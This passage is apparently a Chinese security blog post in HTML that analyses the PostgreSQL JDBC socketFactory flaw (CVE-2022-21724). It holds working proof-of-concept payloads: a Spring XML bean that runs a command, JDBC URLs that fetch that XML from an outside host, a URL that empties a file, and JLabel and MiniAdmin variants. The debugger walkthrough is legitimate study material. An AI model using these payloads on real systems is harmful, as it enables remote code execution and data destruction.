@@ -1,0 +1,2170 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>PostgreSQL-JDBC-Attack | CurlySean&#39;s Blog</title>
+
+  <link rel="icon" type="image/png" href="/medias/logo.png">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  
+  <!-- 预加载动画 -->
+  
+  
+  <div class="preloader_6" id="loader">
+  <div class="loader"></div>
+</div>
+  <script>
+    var endLoading = function () {
+      document.body.style.overflow = 'auto';
+      document.getElementById('loader').classList.add("loaded");
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+  </script>
+
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script defer>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">CurlySean&#39;s Blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/CurlySean">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">CurlySean&#39;s Blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/CurlySean" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+<!-- prismjs 代码高亮 -->
+
+
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        PostgreSQL-JDBC-Attack
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2025-08-07 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/Java/" class="post-detail-header_category">
+              Java
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script defer src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="HDMcM">PostgreSQL-JDBC-Attack</h1>
+<h2 id="FdnpK">前言</h2>
+之前学习过通过Mysql驱动进行JDBC反序列化，最近有听到JDBC不出网的利用方式，今天来学习一下
+
+<h2 id="NS9IA">PostgreSQL-JDBC RCE</h2>
+<h3 id="aPut1">PostgreSQL Diver出网利用</h3>
+<h4 id="kB94K">影响版本</h4>
+
+<p>受影响版本如下：</p>
+<ul>
+<li>&lt; 42.2.25</li>
+<li>&gt;&#x3D; 42.3.0，&lt; 42.3.2</li>
+</ul>
+<h4 id="K49ou">漏洞环境</h4>
+
+<p>首先在本地构造一个触发漏洞的环境，在pom.xml中导入PostgreSQL依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.postgresql/postgresql --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将以下内容写入poc.xml文件中，并通过<code>python -m http.server 80</code>开启一个http服务</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;test.start()&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造以下漏洞验证代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cve_2022_21724</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://101.36.122.13/poc.png&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/?socketFactory=&quot;</span>+socketFactoryClass+<span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg;</span><br><span class="line">        System.out.println(dbUrl);</span><br><span class="line">        DriverManager.getConnection(dbUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时可以使用如下Poc，可以将文件置空</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//127.0.0.1:5432/test/?socketFactory=java.io.FileOutputStream&amp;socketFactoryArg=test.txt</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="ti04E">漏洞分析</h4>
+
+<p>在<code>DiverManager.getConnection(dbUrl)</code>处打一个断点，跟入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717492031-ea4da014-ca1b-44ee-a486-8d851a7ea585.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717492031-ea4da014-ca1b-44ee-a486-8d851a7ea585.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>判断出使用<code>postgresql</code>的JDBC驱动进行连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717670986-4dae398e-4241-4d4e-8be4-bd5e6f32b097.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717670986-4dae398e-4241-4d4e-8be4-bd5e6f32b097.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>parseURL会从url中将参数解析出来（里面的逻辑这里不看了，师傅们可以自己去看一下），并调用<code>makeConnection</code>开始连接数据库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718092484-ad97875f-07ab-48c7-beef-520adaef1409.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718092484-ad97875f-07ab-48c7-beef-520adaef1409.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>PgConnection</code>的构造方法中，这里调用<code>ConnectionFactory#openConnection</code>，将连接数据库所需要的参数传入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718339310-ac9f14ec-7e46-47f6-9772-fa125ee85453.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718339310-ac9f14ec-7e46-47f6-9772-fa125ee85453.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进到<code>ConnectionFactoryImpl#openConnectionImpl</code>方法中，因为我们的可控都在info中，因此我们只需要跟着info走就行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718566440-1e03af9f-f2eb-44c0-8c27-1d119990b8eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718566440-1e03af9f-f2eb-44c0-8c27-1d119990b8eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>再次跟进到<code>SocketFactoryFactory.getSocketFactory(info)</code>方法中，这里get到了<code>socketFactoryClassName</code>和<code>socketFactoryArg</code>，并传入<code>instantiate</code>方法中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718857538-90c7558e-cffb-40f6-b273-60961c79956e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718857538-90c7558e-cffb-40f6-b273-60961c79956e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在<code>ObjectFactory#instantiate</code>中，实际是通过反射调用去构造一个<code>ClassPathXmlApplicationContext</code>类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719038204-51b7a651-6c10-472a-be4d-f76a4238a178.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719038204-51b7a651-6c10-472a-be4d-f76a4238a178.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟到<code>ClassPathXmlApplicationContext</code>的构造函数中，首先将xml文件的远程url地址赋值<code>configLocations</code>，然后调用<code>refresh</code>方法，我们跟进查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719306701-2c2860f8-bdd6-41e5-a2ff-84ee14fc7f00.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719306701-2c2860f8-bdd6-41e5-a2ff-84ee14fc7f00.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>这里的<code>obtainFreshBeanFactory</code>方法，是从远程加载我们的xml文件内容的，跟进看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719417570-eb338480-8875-4bb0-84b2-cade058a50f3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719417570-eb338480-8875-4bb0-84b2-cade058a50f3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟入<code>refreshBeanFactory</code>，调用了<code>loadBeanDefinitions</code>方法，继续跟进查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720025961-1789c579-f995-4f27-a73f-4fc2590da661.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720025961-1789c579-f995-4f27-a73f-4fc2590da661.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>最后在<code>reader#loadBeanDefinitions</code>中读取了我们的xml文件内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720116534-a9be4289-d1f5-4a1c-a23a-02f574fb9554.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720116534-a9be4289-d1f5-4a1c-a23a-02f574fb9554.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>返回<code>refresh</code>方法中，漏洞的触发在<code>finishBeanFactoryInitialization</code>方法内，这里对我们传入的poc.xml文件进行解析，最后SPEL表达式的执行，然后触发漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752721327115-2dc5d9fd-74cc-4520-b302-33bbffd33d5e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752721327115-2dc5d9fd-74cc-4520-b302-33bbffd33d5e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>漏洞触发情况如下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1752721424465-20e7cd1a-28f5-45cc-a1d3-900e0a1ed300.png?x-oss-process=image/format,webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1752721424465-20e7cd1a-28f5-45cc-a1d3-900e0a1ed300.png?x-oss-process=image/format,webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="f8A4x">其他利用方式</h4>
+
+<p>其他的利用方式这里就不分析了，只给出相关Poc</p>
+<h5 id="mczVG">JLabel</h5>
+
+<p>CS RCE 的套娃，需要依赖 batik-swing，同时对 JDK 环境及版本也有要求。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=javax.swing.JLabel&amp;socketFactoryArg=&lt;html&gt;&lt;object classid=&quot;org.apache.batik.swing.JSVGCanvas&quot;&gt;&lt;param name=&quot;URI&quot; value=&quot;http://localhost:8080/1.xml&quot;&gt;&lt;/object&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="A8bcB">MiniAdmin</h5>
+Mysql的套娃，需要有mysql-connector-java（<font style="color:rgb(0, 0, 0);">这个类在高版本才有</font>）
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=com.mysql.cj.jdbc.admin.MiniAdmin&amp;socketFactoryArg=jdbc:mysql://127.0.0.1:3306/test?...</span><br></pre></td></tr></table></figure>
+
+<h5 id="tVBEe">IniEnvironment</h5>
+
+<p>在 ActiveMQ 不出网利用中出现的类，可以配合 BCEL 加载以及反序列化，需要依赖 activemq-shiro 以及对应依赖</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 